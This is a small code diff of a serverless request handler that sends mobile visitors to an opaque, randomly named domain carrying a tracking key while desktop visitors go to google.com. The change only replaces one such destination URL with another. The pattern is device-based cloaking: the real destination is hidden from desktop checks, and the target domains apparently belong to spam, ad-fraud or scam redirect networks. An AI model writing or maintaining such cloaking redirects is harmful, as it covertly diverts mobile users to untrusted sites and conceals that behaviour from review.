@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://markswaitingrouge.com/gpeixuy44e?key=fb5f083d6d407041b969e9429d39ab9d", 302);
+    return Response.redirect("https://gravelsemesterflourish.com/qnm1mgaxd?key=90cb37ba327d842326d733e95b26f92c", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
